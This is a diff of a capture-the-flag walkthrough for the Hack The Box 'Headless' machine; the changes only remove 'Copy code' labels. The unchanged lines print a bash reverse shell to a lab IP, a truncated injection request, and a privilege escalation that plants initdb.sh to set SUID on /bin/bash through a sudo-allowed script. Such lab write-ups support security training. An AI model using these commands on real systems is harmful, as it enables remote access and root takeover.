@@ -104,7 +104,7 @@ HTB simulates an admin reviewing reports by using a script that processes the re
 
 shell
 
-Copy code
+
 
 `/bin/bash -c 'bash -i &> /dev/tcp/10.10.14.34/4444 0>&1'`
 
@@ -112,7 +112,7 @@ Copy code
 
 shell
 
-Copy code
+
 
 `curl --path-as-is -i -s -k -X POST \\     -H 'Host: 10.10.11.8:5000' -H 'Content-Length: 118' -H 'Cache-Control: max-age=0' -H 'Upgrade-Insecure-Requests: 1' -H 'Origin: http://10.10.11.8:5000' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H 'Referer: http...`
 
@@ -128,7 +128,6 @@ Check sudo privileges:
 
 shell
 
-Copy code
 
 `sudo -l`
 
@@ -136,7 +135,6 @@ Copy code
 
 ruby
 
-Copy code
 
 `Matching Defaults entries for dvir on headless:     env_reset, mail_badpass,     secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin,     use_pty  User dvir may run the following commands on headless:     (ALL) NOPASSWD: /usr/bin/syscheck`
 
@@ -150,7 +148,6 @@ Contents of /usr/bin/syscheck:
 
 shell
 
-Copy code
 
 `strings /usr/bin/syscheck`
 
@@ -158,7 +155,7 @@ Copy code
 
 shell
 
-Copy code
+
 
 `#!/bin/bash if [ "$EUID" -ne 0 ]; then   exit 1 fi last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1) formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M") /usr/bin/echo "Last Kernel Modification Time: $formatted_time" disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}') /usr/bin/echo "Available disk space: $disk_space" load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}') /usr/bin/echo "System load average: $load_average" if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then   /usr/bin/echo "Database service is not running. Starting it..."   ./initdb.sh 2>/dev/null else   /usr/bin/echo "Database service is running." fi exit 0`
 
@@ -174,7 +171,7 @@ Create a malicious initdb.sh script to escalate privileges.
 
 shell
 
-Copy code
+
 
 `echo "chmod u+s /bin/bash" > /home/dvir/initdb.sh chmod +x /home/dvir/initdb.sh sudo /usr/bin/syscheck`
 
